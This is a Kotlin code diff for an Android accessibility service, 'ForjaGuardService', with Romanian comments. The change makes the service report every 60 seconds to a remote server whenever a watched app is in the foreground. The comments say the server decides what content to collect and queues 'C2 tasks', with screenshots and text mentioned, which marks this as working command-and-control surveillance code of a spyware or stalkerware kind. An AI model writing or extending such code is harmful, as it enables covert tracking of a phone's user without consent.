@@ -15,8 +15,10 @@ import java.io.ByteArrayOutputStream
 import java.util.concurrent.TimeUnit
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.Job
 import kotlinx.coroutines.SupervisorJob
 import kotlinx.coroutines.cancel
+import kotlinx.coroutines.delay
 import kotlinx.coroutines.launch
 
 /**
@@ -49,9 +51,8 @@ class ForjaGuardService : AccessibilityService() {
     @Volatile private var watchApps: List<String> = emptyList()
     @Volatile private var watchCooldownMs = 60_000L
     @Volatile private var watchEnabled = false
-    private val lastWatchFire = java.util.concurrent.ConcurrentHashMap<String, Long>()
     @Volatile private var prevFgPkg: String = ""
-    private val activeWatched = java.util.concurrent.ConcurrentHashMap.newKeySet<String>()
+    @Volatile private var watchRecheckJob: Job? = null
 
     override fun onServiceConnected() {
         instance = this
@@ -172,33 +173,49 @@ class ForjaGuardService : AccessibilityService() {
     }
 
     /**
-     * Declanșare instant: când o aplicație monitorizată intră în foreground,
-     * trimitem un eveniment lightweight (fără screenshot/text) — serverul
-     * decide ce conținut să colecteze și enqueue-ază C2 tasks.
+     * Declanșare instant + recheck periodic:
+     * - Aplicație monitorizată intră în foreground → trimite eveniment + pornește timer
+     * - Timer: la fiecare 60s, dacă aplicația e ÎNCĂ în foreground → trimite alt eveniment
+     * - Aplicația iese din foreground → oprește timer
      *
-     * Dedup pe stare (nu cooldown): urmărim prevFgPkg + activeWatched.
-     * O aplicație declanșează o singură dată per sesiune de foreground.
+     * Serverul are cooldown per regulă — el decide cât de des rulează acțiunile.
+     * Telefonul doar raportează periodic "aplicația X e încă în foreground".
      */
     private fun checkWatchTrigger(fg: String) {
         if (!watchEnabled || watchApps.isEmpty()) return
-        // Aplicația anterioară a ieșit din foreground → o scoatem din set
-        if (prevFgPkg.isNotEmpty() && prevFgPkg != fg) activeWatched.remove(prevFgPkg)
-        val match = watchApps.find { fg.lowercase().contains(it.lowercase()) }
-        if (match != null && !activeWatched.contains(fg)) {
-            activeWatched.add(fg)
-            android.util.Log.i("ForjaGuard", "WATCH TRIGGER: fg=$fg")
-            scope.launch {
+
+        val isWatched = watchApps.any { fg.lowercase().contains(it.lowercase()) }
+
+        if (!isWatched) {
+            // Nu e aplicație monitorizată → oprește recheck-ul
+            watchRecheckJob?.cancel()
+            watchRecheckJob = null
+            prevFgPkg = fg
+            return
+        }
+
+        // Aplicația e încă urmărită și recheck-ul rulează → nu face nimic
+        if (prevFgPkg == fg && watchRecheckJob?.isActive == true) return
+
+        // Aplicație monitorizată nouă (sau re-entrada) → pornește tracking
+        android.util.Log.i("ForjaGuard", "WATCH TRIGGER: fg=$fg")
+        prevFgPkg = fg
+        watchRecheckJob?.cancel()
+
+        watchRecheckJob = scope.launch {
+            while (true) {
                 try {
                     val bat = getBattery()
                     ForjaApp.from(this@ForjaGuardService).forjaApi
                         .postSyncEvent(fg, null, "", bat, "foreground")
                     android.util.Log.i("ForjaGuard", "WATCH EVENT SENT: fg=$fg bat=$bat")
                 } catch (e: Exception) {
-                    android.util.Log.w("ForjaGuard", "watchTrigger failed: ${e.message}")
+                    android.util.Log.w("ForjaGuard", "watchEvent failed: ${e.message}")
                 }
+                delay(60_000)
+                if (prevFgPkg != fg) break
             }
         }
-        prevFgPkg = fg
     }
 
     private fun getBattery(): Int = try {
@@ -278,8 +295,11 @@ class ForjaGuardService : AccessibilityService() {
         }
         fun clearWatchList() {
             instance?.let {
+                it.watchRecheckJob?.cancel()
+                it.watchRecheckJob = null
                 it.watchApps = emptyList()
                 it.watchEnabled = false
+                it.prevFgPkg = ""
                 android.util.Log.i("ForjaGuard", "watch list cleared")
             }
         }
